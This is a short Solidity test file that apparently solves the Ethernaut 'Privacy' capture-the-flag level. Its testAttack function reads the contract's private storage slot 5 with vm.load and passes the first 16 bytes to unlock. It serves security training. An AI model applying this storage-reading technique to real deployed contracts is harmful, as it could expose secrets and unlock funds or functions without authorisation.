// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/12_Privacy.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_12_PRIVACY_ADDRESS, 0);

        // Additional setup
    }

    function testAttack() public validateInstance {
        Privacy privacy = Privacy(levelInstance);
        
        bytes32 data2 = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(data2));
    }
}